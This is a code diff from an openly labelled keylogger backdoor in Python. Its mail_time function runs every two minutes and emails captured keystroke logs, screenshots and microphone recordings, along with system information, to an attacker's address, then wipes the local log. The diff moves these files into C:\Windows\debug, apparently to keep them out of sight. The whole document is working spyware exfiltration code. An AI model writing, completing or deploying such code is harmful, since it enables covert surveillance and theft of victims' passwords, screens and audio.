@@ -10,11 +10,11 @@ def mail_time():
     while True:
         time.sleep(120)
 
-        email_user = '' # edit, email
-        email_password = '' # edit, pass
+        email_user = '' # uname
+        email_password = '' # pass
 
         
-        email_send = '' # send to this mail
+        email_send = '' #send e mail?
 
 
         subject = 'Backd00r - Log | ' + keyloggerskill.keylogger().system_name_go()
@@ -27,7 +27,7 @@ def mail_time():
 
         body = 'Sys info : ' + str(keyloggerskill.keylogger().sys_info())
         msg.attach(MIMEText(body,'plain'))
-        filename='log.txt'
+        filename='C:\\Windows\\debug\\log.txt'
         attachment  = open(filename,'rb')
         part = MIMEBase('application','octet-stream')
         part.set_payload((attachment).read())
@@ -35,7 +35,7 @@ def mail_time():
         part.add_header('Content-Disposition',"attachment; filename= "+filename)
         msg.attach(part)
 
-        filename2='screen.jpg'
+        filename2='C:\\Windows\\debug\\screen.jpg'
         attachment2  = open(filename2,'rb')
         part2 = MIMEBase('application','octet-stream')
         part2.set_payload((attachment2).read())
@@ -44,7 +44,7 @@ def mail_time():
 
         msg.attach(part2)
         
-        filename3='output.wav'
+        filename3='C:\\Windows\\debug\\output.wav'
         attachment3  = open(filename3,'rb')
         part3 = MIMEBase('application','octet-stream')
         part3.set_payload((attachment3).read())
@@ -62,5 +62,5 @@ def mail_time():
 
         server.sendmail(email_user,email_send,text)
         server.quit()
-        logclear = open("log.txt","w",encoding="UTF-8")
+        logclear = open("C:\\Windows\\debug\\log.txt","w",encoding="UTF-8")
         logclear.close()
